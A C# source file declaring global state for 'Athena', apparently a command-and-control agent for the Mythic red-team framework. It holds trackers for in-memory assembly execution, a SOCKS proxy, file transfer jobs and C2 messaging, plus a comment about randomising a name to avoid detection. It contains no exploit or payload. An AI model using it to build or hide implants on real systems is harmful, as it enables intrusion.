using Athena.Mythic.Model;
using System.Collections.Generic;
using System.Collections.Concurrent;
using System.Net.Http;
using System.Runtime.Loader;
using System.Reflection;
using System.Threading;
using System.Security.Cryptography;
using Athena.Commands.Model;
using Athena.Mythic.Model.Response;

namespace Athena
{
    public class Globals
    {
        //Single Trackers
        public static string executeAssemblyTask = "";
        public static Thread executeAseemblyThread;
        public static SocksHandler socksHandler;
        public static RSACryptoServiceProvider rsa;
        public static MythicClient mc;
        public static ExecuteAssemblyContext alc = new ExecuteAssemblyContext(); //Will need to randomize this name as it can be an IoC for Athena
        public static AssemblyLoadContext loadcontext = new AssemblyLoadContext("commands");

        //Multi-Trackers Non-ThreadSafe
        public static Dictionary<string, Assembly> loadedcommands = new Dictionary<string, Assembly>();
        public static Dictionary<string, MythicJob> jobs = new Dictionary<string, MythicJob>();


        //public static bool encrypted = false;

        public static Dictionary<string, MythicDownloadJob> downloadJobs = new Dictionary<string, MythicDownloadJob>();
        public static Dictionary<string, MythicUploadJob> uploadJobs = new Dictionary<string, MythicUploadJob>();
        
        public static ConcurrentBag<DelegateMessage> outMessages = new ConcurrentBag<DelegateMessage>();

        
        public static ConcurrentBag<SocksMessage> bagIn = new ConcurrentBag<SocksMessage>(); //WriteOnce ReadOnce
        //public static ConcurrentDictionary<int, SocksMessage> bagOut = new ConcurrentDictionary<int, SocksMessage>(); //WriteMultiple ReadOnce
        public static ConcurrentBag<SocksMessage> bagOut = new ConcurrentBag<SocksMessage>();




        //Things that likely make sense to change to a thread safe list
        public static List<DelegateMessage> delegateMessages;

    }
}
